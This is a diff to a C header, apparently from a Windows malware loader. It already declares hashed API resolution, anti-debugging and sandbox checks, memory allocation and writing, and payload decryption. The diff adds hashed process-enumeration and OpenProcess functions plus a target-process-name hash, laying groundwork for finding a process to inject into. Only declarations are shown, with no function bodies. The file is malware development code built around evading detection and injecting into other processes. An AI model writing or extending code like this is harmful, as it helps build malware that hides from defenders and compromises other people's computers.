@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdint.h>
+#include <tlhelp32.h>
 
 #define ASSOCATION_TABLE_SIZE 256
 
@@ -81,6 +82,31 @@ typedef BOOL(WINAPI *GetDiskFreeSpaceExFuncA)(
     PULARGE_INTEGER
 );
 
+typedef BOOL(WINAPI *Proc32First)(
+    HANDLE hSnapshot,
+    LPPROCESSENTRY32 lppe
+);
+
+typedef BOOL(WINAPI *Proc32Next)(
+    HANDLE hSnapshot,
+    LPPROCESSENTRY32 lppe
+);
+
+typedef HANDLE(WINAPI *CreateToolhelp32Snap)(
+    DWORD dwFlags,
+    DWORD th32ProcessID
+);
+
+typedef HANDLE(WINAPI *OpenProc)(
+    DWORD dwDesiredAccess,
+    BOOL bInheritHandle,
+    DWORD dwProcessId
+);
+
+typedef BOOL(WINAPI *CloseHndle)(
+    HANDLE hObject
+);
+
 
 typedef void (WINAPI *GetSystemInfoFunc)(LPSYSTEM_INFO);
 typedef HKL(WINAPI *GetKeyboardLayoutFunc)(DWORD idThread);
@@ -95,6 +121,8 @@ extern const ObjHash NTDLL_HASH;
 extern const ObjHash USER32_HASH;
 extern const ObjHash KERNEL32_HASH;
 
+extern const ObjHash TARGET_PROCESS_NAME_HASH;
+
 extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
 extern const ObjHash GET_COMPUTER_NAME_HASH;
 extern const ObjHash GET_DISK_FREE_SPACE_HASH;
@@ -104,6 +132,11 @@ extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
 extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
 extern const ObjHash GET_KEYBOARD_LAYOUT_HASH;
 extern const ObjHash LOAD_LIBRARY_HASH;
+extern const ObjHash PROC32_FIRST_HASH;
+extern const ObjHash PROC32_NEXT_HASH;
+extern const ObjHash OPEN_PROCESS_HASH;
+extern const ObjHash CLOSE_HANDLE_HASH;
+extern const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH;
 
 extern const ObjHash VIRTUAL_ALLOC_HASH;
 extern const ObjHash WRITE_MEMORY_HASH;
@@ -129,6 +162,8 @@ void DICT_decrypt(const char* dict_payload);
 
 HMODULE CustomGetModuleHandle(ObjHash module_hash);
 FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);
+DWORD _GetProcessID(HMODULE hKernel32, ObjHash procNameHash);
+
 
 bool is_being_debugged();
 int get_disk_size(HMODULE hKernel32dll);
